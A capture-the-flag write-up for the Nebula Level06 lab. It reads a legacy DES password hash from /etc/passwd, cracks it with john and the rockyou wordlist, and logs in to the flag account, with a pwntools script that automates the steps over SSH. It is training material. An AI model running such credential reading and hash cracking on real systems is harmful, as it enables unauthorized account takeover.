# Level06

#### Description

The **flag06** account credentials came from a legacy unix system.

To do this level, log in as the **level06** account with the password **level06**. Files for this level can be found in /home/flag06.

#### Solution

As the question suggests flag06 account credentials came from a legacy unix system and we know earlier unix used to store account hashes in /etc/passwd file. So, we can simply check that file.

```bash
level06@nebula:/home/flag06$ cat /etc/passwd | grep -iw "flag06"
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

Here we can see flag06 account password hash. As it is legacy old unix system, it may be encrypted in DES or DEScrypt format and we can simply crack it via john or hashcat.

```bash
┌──(ghost㉿kali)-[~/nebula/level05]
└─$ echo 'ueqwOCnSGdsuM' > hash                            
                                                                                                                                                 
┌──(ghost㉿kali)-[~/nebula/level05]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (?)     
1g 0:00:00:00 DONE (2025-09-28 06:22) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..rocky06
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got the plaintext password now and can switch to that flag06 account.

```bash
level06@nebula:/home/flag06$ su flag06
Password: 
sh-4.2$ id
uid=993(flag06) gid=993(flag06) groups=993(flag06)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level06', password='level06')

# Extract flag06 account password hash
out = session.run("cat /etc/passwd | grep -iw 'flag06' | cut -d ':' -f2")
pass_hash = out.recvall().decode()
print(f"Got flag06 account's password hash: {pass_hash}")

# Start a remote shell and switch to user flag06
terminal = session.shell()
terminal.sendline("su flag06")
terminal.recvuntil("Password: ")
terminal.sendline("hello")
terminal.recvuntil("$ ")
terminal.sendline("getflag")
terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
